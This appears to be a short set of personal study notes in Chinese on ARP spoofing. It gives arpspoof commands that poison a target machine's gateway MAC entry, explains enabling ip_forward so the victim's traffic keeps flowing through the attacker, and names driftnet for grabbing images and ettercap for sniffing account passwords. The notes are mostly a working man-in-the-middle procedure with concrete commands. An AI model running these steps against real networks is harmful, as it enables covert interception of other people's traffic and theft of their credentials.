#arp
## arp攻击
### 向目标机器广播虚假的网关mac地址
```
arpspoof -i eth0 -t 靶机ip 攻击机ip
--对ip192.168.2.134 进行网关欺骗,此时若不打开ip_forward转发则134无法访问外网
sudo arpspoof -t 192.168.2.134  192.168.2.1  -i eth0
```

### 查看ip对应mac地址
```
arp -a
sudo arping 192.168.2.127
```

### 开机ip_forward转发
```
sudo vim /etc/sysctl.conf
/proc/sys/net/ipv4/ip_forward值经常变换
将里面net.ipv4.ip_forward的值改为 1
然后执行
sysctl -p

另外ip_forward可以打通2个不同的网段
```

### driftnet
```
利用driftnet 目标机器网络中传输的图片
```

### ettercap
```
ettercap -Tq -i eth0进行账号密码嗅探，但是此处测试了下并没有抓到相关账户密码信息。
```
